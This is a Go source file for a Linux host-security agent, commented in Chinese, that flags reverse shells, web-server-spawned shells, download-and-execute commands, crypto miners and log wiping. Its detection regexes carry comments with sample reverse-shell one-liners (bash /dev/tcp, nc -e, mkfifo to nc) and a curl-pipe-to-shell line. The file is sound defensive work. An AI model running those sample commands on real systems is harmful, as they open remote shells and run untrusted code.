package agent

import (
	"path/filepath"
	"regexp"
	"strings"
)

// ExecInfo 是一次程序执行的信息，由进程监控在 exec 时从 /proc 读取。
type ExecInfo struct {
	PID        int
	PPID       int
	User       string
	Exe        string // 可执行文件路径
	Comm       string // 进程名
	Cmdline    string
	ParentComm string
	ParentExe  string
	TTY        bool // 是否交互式终端会话
	// StdioNetwork 为 true 表示标准输入或输出连接到 TCP 连接（不是本地套接字或管道）
	StdioNetwork bool
	StdioRemote  string // 对端地址
}

// CmdFinding 是一条命令检测结果。
type CmdFinding struct {
	Rule     string // 规则 ID
	Name     string
	Severity string // high / medium
	Reason   string
}

var shells = map[string]bool{"sh": true, "bash": true, "dash": true, "zsh": true, "ash": true, "ksh": true, "busybox": true, "fish": true}

// Web 服务进程直接派生 shell 或侦察命令，几乎只出现在 Webshell / 远程代码执行之后。
var webServers = map[string]bool{"nginx": true, "httpd": true, "apache2": true, "lighttpd": true, "caddy": true, "php-cgi": true}

// 应用服务器有时会合法地调用 shell（例如运维脚本），级别为中。
var appServers = map[string]bool{"java": true, "node": true, "uwsgi": true, "gunicorn": true, "tomcat": true}

var reconTools = map[string]bool{"id": true, "whoami": true, "uname": true, "ifconfig": true, "ip": true, "netstat": true,
	"ss": true, "hostname": true, "cat": true, "ls": true, "ps": true, "wget": true, "curl": true, "nc": true, "ncat": true}

type cmdRule struct {
	id, name, severity string
	re                 *regexp.Regexp
}

var cmdRules = []cmdRule{
	{"reverse_shell_cmd", "反弹 shell 命令", "high", regexp.MustCompile(
		`/dev/(tcp|udp)/[^/\s]+/\d+` + // bash -i >& /dev/tcp/1.2.3.4/4444 0>&1
			`|\b(nc|ncat|netcat)\b[^|;&]*\s-(e|c)\s` + // nc -e /bin/sh
			`|\bsocat\b[^|;&]*\bexec:` + // socat tcp:...,exec:sh
			`|mkfifo\b[^;]*;[^;]*\b(nc|ncat|telnet)\b` + // rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ...
			`|\bpython[23]?\b.*\bsocket\b.*\b(pty\.spawn|subprocess|os\.dup2)` +
			`|\bperl\b.*\bsocket\b.*\bexec\b` +
			`|\bphp\b.*\bfsockopen\b` +
			`|\bruby\b.*\bTCPSocket\b`)},
	{"download_exec", "下载并执行", "high", regexp.MustCompile(
		`\b(curl|wget)\b[^|;]*\|\s*(sudo\s+)?(ba|da|z|k)?sh\b` + // curl x | sh
			`|\b(curl|wget)\b.{0,200}\s-[oO]\s*\S+.{0,80}(chmod\s+[0-7+]*x|&&\s*\./)` + // wget -O /tmp/x && chmod +x
			`|\bbase64\s+(-d|--decode)\b[^|]*\|\s*(ba|da|z|k)?sh\b`)},
	{"crypto_miner", "挖矿程序", "high", regexp.MustCompile(`stratum\+(tcp|ssl)://|\bxmrig\b|--donate-level`)},
	{"defense_evasion", "清除痕迹", "medium", regexp.MustCompile(
		`\bhistory\s+-c\b|\bunset\s+HISTFILE\b|HISTFILE=/dev/null|\brm\b[^;|]*\.(bash|zsh)_history` +
			`|>\s*/var/log/(auth\.log|secure|messages|syslog|wtmp|btmp|lastlog)\b|\bshred\b[^;|]*/var/log/`)},
}

// EvaluateExec 对一次程序执行运行全部规则。
func EvaluateExec(e ExecInfo) []CmdFinding {
	var out []CmdFinding
	comm := strings.TrimSpace(e.Comm)
	base := filepath.Base(e.Exe)

	if (shells[comm] || shells[base]) && e.StdioNetwork {
		out = append(out, CmdFinding{"reverse_shell", "反弹 shell", "high",
			"shell 的标准输入输出连接到网络 " + e.StdioRemote})
	}
	for _, r := range cmdRules {
		if r.re.MatchString(e.Cmdline) {
			out = append(out, CmdFinding{r.id, r.name, r.severity, "命令匹配特征"})
		}
	}
	parent := strings.TrimSpace(e.ParentComm)
	if strings.HasPrefix(parent, "php-fpm") {
		parent = "php-cgi"
	}
	if shells[comm] || reconTools[comm] {
		switch {
		case webServers[parent]:
			out = append(out, CmdFinding{"web_spawn", "Web 服务派生命令", "high",
				"Web 服务进程 " + e.ParentComm + " 执行了 " + comm + "（Webshell / 远程代码执行迹象）"})
		case appServers[parent] && shells[comm]:
			out = append(out, CmdFinding{"app_spawn_shell", "应用服务派生 shell", "medium",
				"应用进程 " + e.ParentComm + " 启动了 shell，确认是否为业务正常行为"})
		}
	}
	return out
}
